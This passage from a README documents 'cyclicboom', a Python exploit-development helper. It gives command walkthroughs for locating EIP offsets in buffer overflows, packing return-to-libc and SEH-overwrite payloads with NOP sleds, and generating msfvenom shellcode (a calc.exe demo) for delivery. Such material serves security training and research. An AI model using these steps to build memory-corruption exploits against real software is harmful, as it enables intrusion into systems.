- If found: `EIP value found at offset 512 (little-endian), Last byte before EIP: offset 511, EIP byte: offset 512`

2. **Big-Endian Detection**:
- If `0x41424344` is reversed, reports `(big-endian)`.

### Use Cases

1. **Finding Buffer Overflow Offset**:
- Generate: `python cyclicboom.py --mode generate --output crash.bin --length 2000`
- Feed `crash.bin` to the app (e.g., via socket).
- Crash in Immunity Debugger, note EIP (e.g., `0x61416141`).
- Search: `python cyclicboom.py --mode search --input crash.bin --eip-value 61416141`
- Result: Offset (e.g., 1024).

2. **Crafting Return-to-LibC Payload**:
- After finding offset 1011: `python cyclicboom.py --mode pack --output rtlg.bin --length 1011 --suffix-byte 0xF9350101 --nop-sled-length 16 --shellcode-payload shellcode.bin --payload-format raw`
- Replace `0xF9350101` with `system()` address.
- Test with Mona: `!mona suggest`.

3. **SEH Overwrite with Avoided Chars**:
- Generate: `python cyclicboom.py --mode generate --output seh.bin --length 500 --avoid-chars "\x00" --suffix "EB06POPPOP"`
- Search for SEH offset, then pack with shellcode.

4. **Shellcode Delivery with NOP Sled**:
- Generate shellcode with `msfvenom -p windows/exec CMD=calc.exe -f raw > calc.bin`.
- Pack: `python cyclicboom.py --mode pack --output exploit.bin --length 1011 --suffix-byte 0xF9350101 --nop-sled-length 32 --shellcode-payload calc.bin --payload-format raw`
- Delivers shellcode after precise EIP control.

## Troubleshooting

- **Invalid Hex**: Ensure even-length hex strings (`--prefix-byte`, `--suffix-byte`, `--payload-format hex`).
- **No EIP Match**: Verify input file matches generated pattern; check endianness.
- **Pattern Truncation**: Reduce `--length` or relax `--avoid-chars` if unique combos are exhausted.
- **Shellcode Errors**: Ensure `--shellcode-payload` exists and matches `--payload-format`.
- **Python Version**: Use 2.7.1 for compatibility.

## Contributing

Pull requests welcome! Fork, branch, and submit PRs. Maintain Python 2.7.1 compatibility.

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
3. Commit changes (`git commit -m 'Add some AmazingFeature'`).
4. Push (`git push origin feature/AmazingFeature`).
5. Open a PR.

## License

Distributed under the MIT License. See `LICENSE` for more info.

---

*Built with ❤️ for exploit devs. Questions? Open an issue!*